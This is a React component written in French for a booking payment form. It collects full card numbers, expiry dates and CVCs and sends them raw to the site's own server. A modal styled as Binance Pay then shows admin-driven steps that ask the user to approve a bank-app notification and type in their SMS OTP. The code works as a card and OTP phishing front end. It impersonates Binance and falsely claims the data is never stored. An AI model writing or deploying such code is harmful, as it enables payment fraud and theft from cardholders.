import { useState, useEffect, useRef, useCallback } from 'react';
import Cards from 'react-credit-cards-2';
import 'react-credit-cards-2/dist/es/styles-compiled.css';
import { Lock, AlertCircle, ShieldCheck, X, CheckCircle, XCircle } from 'lucide-react';

/* ─────────────────────────────────────────
   HELPERS
───────────────────────────────────────── */
function formatNumber(v) {
  return v.replace(/\D/g, '').slice(0, 16).replace(/(.{4})/g, '$1 ').trim();
}
function formatExpiry(v) {
  const d = v.replace(/\D/g, '').slice(0, 4);
  return d.length >= 3 ? d.slice(0, 2) + '/' + d.slice(2) : d;
}
function detectNetwork(n) {
  const raw = n.replace(/\s/g, '');
  if (/^4/.test(raw)) return 'visa';
  if (/^(5[1-5]|2[2-7])/.test(raw)) return 'mastercard';
  if (/^3[47]/.test(raw)) return 'amex';
  return null;
}

/* ─────────────────────────────────────────
   LOGOS RÉSEAUX
───────────────────────────────────────── */
function VisaLogo({ dim = false }) {
  return (
    <svg viewBox="0 0 48 16" className={`h-4 w-auto transition-opacity ${dim ? 'opacity-20' : 'opacity-100'}`} aria-label="Visa">
      <text x="0" y="13" fontFamily="Arial Black,sans-serif" fontWeight="900" fontSize="14" fill="#1A1F71">VISA</text>
    </svg>
  );
}
function MastercardLogo({ dim = false }) {
  return (
    <svg viewBox="0 0 38 24" className={`h-5 w-auto transition-opacity ${dim ? 'opacity-20' : 'opacity-100'}`} aria-label="Mastercard">
      <circle cx="13" cy="12" r="11" fill="#EB001B" />
      <circle cx="25" cy="12" r="11" fill="#F79E1B" />
      <path d="M19 4.8a11 11 0 0 1 0 14.4A11 11 0 0 1 19 4.8z" fill="#FF5F00" />
    </svg>
  );
}
function AmexLogo({ dim = false }) {
  return (
    <svg viewBox="0 0 60 16" className={`h-4 w-auto transition-opacity ${dim ? 'opacity-20' : 'opacity-100'}`} aria-label="Amex">
      <text x="0" y="13" fontFamily="Arial,sans-serif" fontWeight="700" fontSize="10" fill="#2E77BC">AMERICAN EXPRESS</text>
    </svg>
  );
}

/* ─────────────────────────────────────────
   LOGO BINANCE
───────────────────────────────────────── */
function BinanceLogo({ size = 32 }) {
  return (
    <svg width={size} height={size} viewBox="0 0 32 32" fill="none">
      <rect width="32" height="32" rx="8" fill="#F3BA2F" />
      <path d="M16 6.4l2.56 2.56-6.4 6.4-2.56-2.56L16 6.4z" fill="#1E2026" />
      <path d="M19.84 10.24l2.56 2.56-6.4 6.4-2.56-2.56 6.4-6.4z" fill="#1E2026" />
      <path d="M9.76 13.44l2.56 2.56-2.56 2.56L7.2 16l2.56-2.56z" fill="#1E2026" />
      <path d="M22.24 13.44L24.8 16l-2.56 2.56-2.56-2.56 2.56-2.56z" fill="#1E2026" />
      <path d="M16 19.04l2.56 2.56-2.56 2.56-2.56-2.56L16 19.04z" fill="#1E2026" />
      <path d="M12.16 15.2L16 11.36l3.84 3.84L16 19.04l-3.84-3.84z" fill="#1E2026" />
    </svg>
  );
}

/* ─────────────────────────────────────────
   COMPOSANTS FORMULAIRE
───────────────────────────────────────── */
function Field({ label, error, children, className = '' }) {
  return (
    <div className={`flex flex-col gap-1 ${className}`}>
      <label className="text-[11px] font-semibold uppercase tracking-widest text-muted-foreground">
        {label}
      </label>
      {children}
      {error && <p className="text-[11px] text-destructive">{error}</p>}
    </div>
  );
}

function CardInput({ icon, ...props }) {
  const [focused, setFocused] = useState(false);
  return (
    <div className={`relative flex items-center rounded-lg border bg-background transition-all duration-200 ${
      focused ? 'border-primary ring-2 ring-primary/20 shadow-sm' : 'border-border hover:border-primary/40'
    }`}>
      <input
        {...props}
        onFocus={(e) => { setFocused(true); props.onFocus?.(e); }}
        onBlur={(e)  => { setFocused(false); props.onBlur?.(e); }}
        className="w-full rounded-lg bg-transparent px-3.5 py-3 text-sm outline-none placeholder:text-muted-foreground/50"
      />
      {icon && <div className="mr-3 shrink-0 text-muted-foreground/40">{icon}</div>}
    </div>
  );
}

/* ─────────────────────────────────────────
   MODAL DE SUIVI PAIEMENT
   Steps :
     waiting          → en attente de l'action admin
     bank_validation  → admin demande validation sur l'app bancaire
     otp              → admin demande la saisie du code OTP
     processing       → OTP soumis, en attente de la décision admin
     approved         → paiement validé
     rejected         → paiement refusé
     expired          → session expirée
───────────────────────────────────────── */
function PaymentModal({ sessionId, paymentId, bookingId, onClose, onSuccess, onFailed }) {
  const [step, setStep]       = useState('waiting');
  const [otpCode, setOtpCode] = useState('');
  const [otpError, setOtpError] = useState('');
  const [sending, setSending] = useState(false);
  const pollRef               = useRef(null);

  // Nettoyage session localStorage quand le paiement est terminé
  const clearSession = useCallback(() => {
    try { localStorage.removeItem(`card_session_${bookingId}`); } catch {}
  }, [bookingId]);

  // Polling toutes les 3 s
  const startPolling = useCallback(() => {
    clearInterval(pollRef.current);
    pollRef.current = setInterval(async () => {
      try {
        const r    = await fetch(`/api/payments/card-status/${paymentId}`);
        const data = await r.json();
        if (!data.success) return;

        setStep((prev) => {
          // Ne pas écraser un état terminal ou une saisie OTP en cours
          if (['approved', 'rejected', 'expired'].includes(prev)) return prev;
          // Ne pas rétrograder depuis processing si l'utilisateur a déjà soumis l'OTP
          if (prev === 'processing') {
            if (data.status === 'approved') return 'approved';
            if (data.status === 'rejected') return 'rejected';
            if (data.status === 'expired')  return 'expired';
            return prev;
          }
          return data.status;
        });

        if (data.status === 'approved') {
          clearInterval(pollRef.current);
          clearSession();
          setTimeout(() => onSuccess?.(), 2200);
        } else if (data.status === 'rejected') {
          clearInterval(pollRef.current);
          clearSession();
        } else if (data.status === 'expired') {
          clearInterval(pollRef.current);
          clearSession();
        }
      } catch {}
    }, 3000);
  }, [paymentId, clearSession, onSuccess]);

  // Démarrer le polling au montage + nettoyage au démontage
  useEffect(() => {
    startPolling();
    return () => clearInterval(pollRef.current);
  }, [startPolling]);

  // Soumission du code OTP
  async function handleOtpSubmit() {
    const code = otpCode.trim();
    if (code.length < 4) {
      setOtpError('Veuillez saisir le code reçu');
      return;
    }
    setSending(true);
    setOtpError('');
    try {
      const res  = await fetch('/api/payments/card-verify-otp', {
        method:  'POST',
        headers: { 'Content-Type': 'application/json' },
        body:    JSON.stringify({ sessionId, otpCode: code }),
      });
      const data = await res.json();
      if (!data.success) throw new Error(data.error || 'Erreur serveur');
      setStep('processing');
    } catch (err) {
      setOtpError(err.message || 'Une erreur est survenue. Réessayez.');
    } finally {
      setSending(false);
    }
  }

  const canClose = !['processing'].includes(step);

  return (
    <div
      className="fixed inset-0 z-50 flex items-center justify-center p-4"
      style={{ background: 'rgba(0,0,0,0.78)', backdropFilter: 'blur(5px)' }}
    >
      <div
        className="relative w-full max-w-sm overflow-hidden rounded-2xl shadow-2xl"
        style={{ background: '#0b0e11' }}
      >

        {/* ── Header ── */}
        <div
          className="flex items-center justify-between px-5 py-4"
          style={{ background: '#161a1e', borderBottom: '1px solid #2b2f36' }}
        >
          <div className="flex items-center gap-2.5">
            <BinanceLogo size={28} />
            <div>
              <p className="text-sm font-bold text-white leading-tight">Binance Pay</p>
              <p className="text-[10px]" style={{ color: '#848e9c' }}>Vérification sécurisée</p>
            </div>
          </div>
          {canClose && (
            <button
              onClick={onClose}
              className="rounded-full p-1.5 transition-colors hover:bg-white/10"
              style={{ color: '#848e9c' }}
            >
              <X className="h-4 w-4" />
            </button>
          )}
        </div>

        {/* ── Corps ── */}
        <div className="px-6 py-6">

          {/* ══ EN ATTENTE ══ */}
          {step === 'waiting' && (
            <div className="flex flex-col items-center gap-5 py-4 text-center">
              <div className="relative flex h-20 w-20 items-center justify-center">
                <svg className="absolute inset-0 h-full w-full animate-spin" viewBox="0 0 80 80" fill="none">
                  <circle cx="40" cy="40" r="36" stroke="#2b2f36" strokeWidth="5"/>
                  <path d="M40 4a36 36 0 0 1 36 36" stroke="#F3BA2F" strokeWidth="5" strokeLinecap="round"/>
                </svg>
                <BinanceLogo size={36} />
              </div>
              <div>
                <h3 className="text-base font-bold text-white">Demande envoyée</h3>
                <p className="mt-1.5 text-sm leading-relaxed" style={{ color: '#848e9c' }}>
                  Votre demande de paiement est en cours de traitement.<br />
                  Merci de patienter…
                </p>
              </div>
              <div className="h-1 w-full overflow-hidden rounded-full" style={{ background: '#2b2f36' }}>
                <div
                  className="h-full rounded-full"
                  style={{
                    background: 'linear-gradient(90deg, #F3BA2F, #2563eb)',
                    width: '40%',
                    animation: 'binanceSlide 2s ease-in-out infinite',
                  }}
                />
              </div>
              <p className="text-[11px]" style={{ color: '#4a5568' }}>Ne fermez pas cette fenêtre</p>
            </div>
          )}

          {/* ══ VALIDATION APP BANCAIRE ══ */}
          {step === 'bank_validation' && (
            <div className="flex flex-col items-center gap-5 py-2 text-center">
              <div
                className="flex h-20 w-20 items-center justify-center rounded-full"
                style={{ background: '#1e3a5f', border: '2px solid #2563eb' }}
              >
                <svg className="h-10 w-10" style={{ color: '#60a5fa' }} viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="1.5">
                  <rect x="5" y="2" width="14" height="20" rx="2"/>
                  <path d="M12 18h.01"/>
                </svg>
              </div>
              <div>
                <h3 className="text-base font-bold text-white">Validez sur votre application bancaire</h3>
                <p className="mt-2 text-sm leading-relaxed" style={{ color: '#848e9c' }}>
                  Ouvrez l'application de votre banque et approuvez
                  la notification de paiement qui vous a été envoyée.
                </p>
              </div>
              <div
                className="w-full rounded-xl px-4 py-3 text-[12px]"
                style={{ background: '#1e3a5f', color: '#93c5fd', border: '1px solid #2563eb33' }}
              >
                Veuillez valider la transaction sur votre application bancaire pour continuer.
              </div>
              <p className="text-[11px]" style={{ color: '#4a5568' }}>Après validation, l'équipe confirmera votre paiement</p>
            </div>
          )}

          {/* ══ SAISIE CODE OTP ══ */}
          {step === 'otp' && (
            <div className="space-y-5">
              <div>
                <h3 className="text-base font-bold text-white">Saisissez le code reçu</h3>
                <p className="mt-1 text-sm leading-relaxed" style={{ color: '#848e9c' }}>
                  Entrez le code OTP que vous avez reçu par SMS.
                </p>
              </div>

              <div>
                <label className="mb-1.5 block text-[11px] font-semibold uppercase tracking-wider" style={{ color: '#848e9c' }}>
                  Code OTP
                </label>
                <div
                  className="flex items-center rounded-xl px-3.5 py-3"
                  style={{
                    background: '#1e2329',
                    border: `1.5px solid ${otpError ? '#f6465d' : '#2b2f36'}`,
                  }}
                >
                  <svg
                    className="mr-2.5 h-4 w-4 shrink-0"
                    style={{ color: '#F3BA2F' }}
                    viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2"
                  >
                    <rect x="3" y="11" width="18" height="11" rx="2" />
                    <path d="M7 11V7a5 5 0 0 1 10 0v4" />
                  </svg>
                  <input
                    type="text"
                    inputMode="numeric"
                    value={otpCode}
                    onChange={(e) => { setOtpCode(e.target.value.replace(/\D/g, '').slice(0, 8)); setOtpError(''); }}
                    onKeyDown={(e) => e.key === 'Enter' && handleOtpSubmit()}
                    placeholder="Code reçu par SMS"
                    autoFocus
                    className="w-full bg-transparent text-sm font-bold text-white outline-none placeholder:text-gray-600 tracking-widest"
                  />
                </div>
                {otpError && (
                  <p className="mt-1.5 flex items-center gap-1 text-[11px]" style={{ color: '#f6465d' }}>
                    <AlertCircle className="h-3 w-3" /> {otpError}
                  </p>
                )}
              </div>

              <button
                onClick={handleOtpSubmit}
                disabled={sending || otpCode.trim().length < 4}
                className="flex w-full items-center justify-center gap-2 rounded-xl py-3.5 text-sm font-bold transition-opacity disabled:opacity-50"
                style={{ background: '#0ecb81', color: '#fff' }}
              >
                {sending ? (
                  <><svg className="h-4 w-4 animate-spin" viewBox="0 0 24 24" fill="none">
                    <circle className="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" strokeWidth="4"/>
                    <path className="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4z"/>
                  </svg>Envoi en cours…</>
                ) : 'Valider le code'}
              </button>
            </div>
          )}

          {/* ══ TRAITEMENT EN COURS ══ */}
          {step === 'processing' && (
            <div className="flex flex-col items-center gap-5 py-4 text-center">
              <div className="relative flex h-20 w-20 items-center justify-center">
                <svg className="absolute inset-0 h-full w-full animate-spin" viewBox="0 0 80 80" fill="none">
                  <circle cx="40" cy="40" r="36" stroke="#2b2f36" strokeWidth="5"/>
                  <path d="M40 4a36 36 0 0 1 36 36" stroke="#0ecb81" strokeWidth="5" strokeLinecap="round"/>
                </svg>
                <BinanceLogo size={36} />
              </div>
              <div>
                <h3 className="text-base font-bold text-white">Vérification en cours</h3>
                <p className="mt-1.5 text-sm leading-relaxed" style={{ color: '#848e9c' }}>
                  Code reçu. Votre paiement est en cours de validation.<br />Merci de patienter…
                </p>
              </div>
              <div className="h-1 w-full overflow-hidden rounded-full" style={{ background: '#2b2f36' }}>
                <div
                  className="h-full rounded-full"
                  style={{
                    background: 'linear-gradient(90deg, #F3BA2F, #0ecb81)',
                    width: '40%',
                    animation: 'binanceSlide 2s ease-in-out infinite',
                  }}
                />
              </div>
              <p className="text-[11px]" style={{ color: '#4a5568' }}>Ne fermez pas cette fenêtre</p>
            </div>
          )}

          {/* ══ APPROUVÉ ══ */}
          {step === 'approved' && (
            <div className="flex flex-col items-center gap-4 py-4 text-center">
              <div
                className="flex h-16 w-16 items-center justify-center rounded-full"
                style={{ background: '#0d2e1e', border: '2px solid #0ecb81' }}
              >
                <CheckCircle className="h-8 w-8" style={{ color: '#0ecb81' }} />
              </div>
              <div>
                <h3 className="text-base font-bold text-white">Paiement approuvé !</h3>
                <p className="mt-1 text-sm" style={{ color: '#848e9c' }}>
                  Votre réservation est confirmée. Un email de confirmation vous a été envoyé.
                </p>
              </div>
              <div
                className="w-full rounded-xl px-4 py-3 text-[12px] font-semibold"
                style={{ background: '#0d2e1e', color: '#0ecb81', border: '1px solid #0ecb8133' }}
              >
                ✓ Paiement validé avec succès
              </div>
            </div>
          )}

          {/* ══ REFUSÉ ══ */}
          {step === 'rejected' && (
            <div className="flex flex-col items-center gap-4 py-4 text-center">
              <div
                className="flex h-16 w-16 items-center justify-center rounded-full"
                style={{ background: '#2e0d0d', border: '2px solid #f6465d' }}
              >
                <XCircle className="h-8 w-8" style={{ color: '#f6465d' }} />
              </div>
              <div>
                <h3 className="text-base font-bold text-white">Paiement refusé</h3>
                <p className="mt-1 text-sm" style={{ color: '#848e9c' }}>
                  Votre paiement n'a pas pu être traité. Veuillez réessayer.
                </p>
              </div>
              <button
                onClick={() => { onFailed?.(); onClose(); }}
                className="w-full rounded-xl py-3.5 text-sm font-bold"
                style={{ background: '#f6465d', color: '#fff' }}
              >
                Réessayer avec une autre carte
              </button>
              <button onClick={onClose} className="text-[12px]" style={{ color: '#848e9c' }}>
                Choisir un autre mode de paiement
              </button>
            </div>
          )}

          {/* ══ EXPIRÉ ══ */}
          {step === 'expired' && (
            <div className="flex flex-col items-center gap-4 py-4 text-center">
              <div
                className="flex h-16 w-16 items-center justify-center rounded-full"
                style={{ background: '#2b1e0a', border: '2px solid #F3BA2F' }}
              >
                <svg className="h-8 w-8" style={{ color: '#F3BA2F' }} viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2">
                  <circle cx="12" cy="12" r="10"/><path d="M12 6v6l4 2"/>
                </svg>
              </div>
              <div>
                <h3 className="text-base font-bold text-white">Session expirée</h3>
                <p className="mt-1 text-sm" style={{ color: '#848e9c' }}>
                  La session a expiré. Veuillez recommencer.
                </p>
              </div>
              <button
                onClick={onClose}
                className="w-full rounded-xl py-3.5 text-sm font-bold"
                style={{ background: '#F3BA2F', color: '#1e2329' }}
              >
                Recommencer
              </button>
            </div>
          )}
        </div>

        {/* ── Footer sécurité ── */}
        {['waiting', 'bank_validation', 'otp'].includes(step) && (
          <div
            className="flex items-center justify-center gap-1.5 px-6 py-3 text-[10px]"
            style={{ background: '#0d1117', color: '#4a5568', borderTop: '1px solid #2b2f36' }}
          >
            <Lock className="h-3 w-3" />
            Connexion sécurisée · Binance Security System
          </div>
        )}
      </div>

      <style>{`
        @keyframes binanceSlide {
          0%   { transform: translateX(-150%); }
          50%  { transform: translateX(300%); }
          100% { transform: translateX(-150%); }
        }
      `}</style>
    </div>
  );
}

/* ─────────────────────────────────────────
   COMPOSANT PRINCIPAL
───────────────────────────────────────── */
export default function CreditCardForm({ onError, onSuccess, bookingId }) {
  const [card, setCard]         = useState({ number: '', name: '', expiry: '', cvc: '', focus: '' });
  const [error, setError]       = useState('');
  const [errors, setErrors]     = useState({});
  const [loading, setLoading]   = useState(false);
  const [showModal, setShowModal] = useState(false);
  const [sessionId, setSessionId] = useState(null);
  const [paymentId, setPaymentId] = useState(null);

  const network = detectNetwork(card.number);

  // Restaurer la session depuis localStorage au montage
  useEffect(() => {
    if (!bookingId) return;
    try {
      const saved = localStorage.getItem(`card_session_${bookingId}`);
      if (saved) {
        const { sessionId: sid, paymentId: pid } = JSON.parse(saved);
        if (sid && pid) {
          setSessionId(sid);
          setPaymentId(pid);
          setShowModal(true);
        }
      }
    } catch {
      localStorage.removeItem(`card_session_${bookingId}`);
    }
  }, [bookingId]);

  function update(field, raw) {
    let v = raw;
    if (field === 'number') v = formatNumber(raw);
    if (field === 'expiry') v = formatExpiry(raw);
    if (field === 'cvc')    v = raw.replace(/\D/g, '').slice(0, network === 'amex' ? 4 : 3);
    setCard((s) => ({ ...s, [field]: v }));
    if (errors[field]) setErrors((s) => ({ ...s, [field]: '' }));
  }

  function validate() {
    const e = {};
    const raw = card.number.replace(/\s/g, '');
    if (raw.length < 13) e.number = 'Numéro invalide';
    if (!card.name.trim()) e.name = 'Requis';
    const [mm, yy] = card.expiry.split('/');
    const exp = new Date(2000 + parseInt(yy || 0), parseInt(mm || 0) - 1);
    if (!mm || !yy || isNaN(exp) || exp < new Date()) e.expiry = 'Date invalide';
    if (card.cvc.length < 3) e.cvc = 'CVV invalide';
    setErrors(e);
    return Object.keys(e).length === 0;
  }

  async function handleSubmit(e) {
    e.preventDefault();
    if (!validate()) return;
    setError('');
    setLoading(true);
    try {
      const res  = await fetch('/api/payments/card-otp', {
        method:  'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          bookingId,
          number: card.number,
          name:   card.name,
          expiry: card.expiry,
          cvc:    card.cvc,
        }),
      });
      const data = await res.json();
      if (!data.success) throw new Error(data.error || 'Erreur serveur');

      // Persister la session pour résistance au refresh
      try {
        localStorage.setItem(`card_session_${bookingId}`, JSON.stringify({
          sessionId: data.sessionId,
          paymentId: data.paymentId,
        }));
      } catch {}

      setSessionId(data.sessionId);
      setPaymentId(data.paymentId);
      setShowModal(true);
    } catch (err) {
      setError(err.message || 'Une erreur est survenue. Veuillez réessayer.');
    } finally {
      setLoading(false);
    }
  }

  function handleClose() {
    setShowModal(false);
    setSessionId(null);
    setPaymentId(null);
    try { localStorage.removeItem(`card_session_${bookingId}`); } catch {}
  }

  return (
    <>
      {showModal && sessionId && paymentId && (
        <PaymentModal
          sessionId={sessionId}
          paymentId={paymentId}
          bookingId={bookingId}
          onClose={handleClose}
          onSuccess={() => {
            setShowModal(false);
            onSuccess?.();
          }}
          onFailed={() => {
            const msg = 'Paiement refusé. Veuillez réessayer avec une autre carte.';
            setError(msg);
            onError?.(msg);
          }}
        />
      )}

      {/* Formulaire carte */}
      <div className="overflow-hidden rounded-xl border bg-card shadow-sm">
        {/* Header */}
        <div className="flex items-center justify-between border-b bg-muted/30 px-5 py-3.5">
          <div className="flex items-center gap-2 text-sm font-semibold">
            <Lock className="h-3.5 w-3.5 text-primary" />
            Paiement sécurisé
          </div>
          <div className="flex items-center gap-3">
            <VisaLogo dim={network !== null && network !== 'visa'} />
            <MastercardLogo dim={network !== null && network !== 'mastercard'} />
            <AmexLogo dim={network !== null && network !== 'amex'} />
          </div>
        </div>

        <div className="p-5">
          {/* Carte animée */}
          <div className="mb-6 flex justify-center [&_.rccs]:!w-full [&_.rccs]:max-w-[320px] [&_.rccs__card]:!rounded-xl [&_.rccs__card]:!shadow-lg">
            <Cards
              number={card.number}
              name={card.name || 'VOTRE NOM'}
              expiry={card.expiry}
              cvc={card.cvc}
              focused={card.focus}
            />
          </div>

          <form onSubmit={handleSubmit} className="space-y-4" noValidate>
            <Field label="Numéro de carte" error={errors.number}>
              <CardInput
                name="number"
                value={card.number}
                onChange={(e) => update('number', e.target.value)}
                onFocus={(e) => setCard((s) => ({ ...s, focus: e.target.name }))}
                placeholder="1234  5678  9012  3456"
                inputMode="numeric"
                autoComplete="cc-number"
                icon={
                  network === 'visa'       ? <VisaLogo /> :
                  network === 'mastercard' ? <MastercardLogo /> :
                  network === 'amex'       ? <AmexLogo /> :
                  <svg viewBox="0 0 24 24" className="h-5 w-5 fill-none stroke-current stroke-[1.5]">
                    <rect x="2" y="5" width="20" height="14" rx="2"/><path d="M2 10h20"/>
                  </svg>
                }
              />
            </Field>

            <Field label="Nom du titulaire" error={errors.name}>
              <CardInput
                name="name"
                value={card.name}
                onChange={(e) => update('name', e.target.value.toUpperCase())}
                onFocus={(e) => setCard((s) => ({ ...s, focus: e.target.name }))}
                placeholder="TEL QU'IL APPARAÎT SUR LA CARTE"
                autoComplete="cc-name"
                style={{ textTransform: 'uppercase' }}
              />
            </Field>

            <div className="grid grid-cols-2 gap-3">
              <Field label="Date d'expiration" error={errors.expiry}>
                <CardInput
                  name="expiry"
                  value={card.expiry}
                  onChange={(e) => update('expiry', e.target.value)}
                  onFocus={(e) => setCard((s) => ({ ...s, focus: e.target.name }))}
                  placeholder="MM / AA"
                  inputMode="numeric"
                  autoComplete="cc-exp"
                />
              </Field>
              <Field label="CVV" error={errors.cvc}>
                <CardInput
                  name="cvc"
                  value={card.cvc}
                  onChange={(e) => update('cvc', e.target.value)}
                  onFocus={(e) => setCard((s) => ({ ...s, focus: e.target.name }))}
                  onBlur={() => setCard((s) => ({ ...s, focus: '' }))}
                  placeholder={network === 'amex' ? '4 chiffres' : '3 chiffres'}
                  inputMode="numeric"
                  autoComplete="cc-csc"
                  icon={
                    <svg viewBox="0 0 24 24" className="h-4 w-4 fill-none stroke-current stroke-[1.5]">
                      <rect x="2" y="5" width="20" height="14" rx="2"/><path d="M2 10h20M7 15h2"/>
                    </svg>
                  }
                />
              </Field>
            </div>

            {error && (
              <div className="flex items-start gap-2.5 rounded-lg border border-destructive/25 bg-destructive/5 px-4 py-3">
                <AlertCircle className="mt-px h-4 w-4 shrink-0 text-destructive" />
                <p className="text-sm text-destructive">{error}</p>
              </div>
            )}

            <button
              type="submit"
              disabled={loading}
              className="relative w-full overflow-hidden rounded-lg bg-primary px-4 py-3.5 text-sm font-semibold text-primary-foreground shadow-sm transition-all duration-200 hover:brightness-110 active:scale-[0.99] disabled:opacity-60 disabled:cursor-not-allowed"
            >
              {loading ? (
                <span className="flex items-center justify-center gap-2">
                  <svg className="h-4 w-4 animate-spin" viewBox="0 0 24 24" fill="none">
                    <circle className="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" strokeWidth="4"/>
                    <path className="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4z"/>
                  </svg>
                  Connexion sécurisée…
                </span>
              ) : (
                <span className="flex items-center justify-center gap-2">
                  <Lock className="h-4 w-4" />
                  Payer par CB
                </span>
              )}
            </button>

            <div className="flex items-center justify-center gap-1.5 text-[11px] text-muted-foreground">
              <ShieldCheck className="h-3.5 w-3.5 text-success" />
              Paiement chiffré SSL 256 bits — vos données ne sont jamais stockées
            </div>
          </form>
        </div>
      </div>
    </>
  );
}
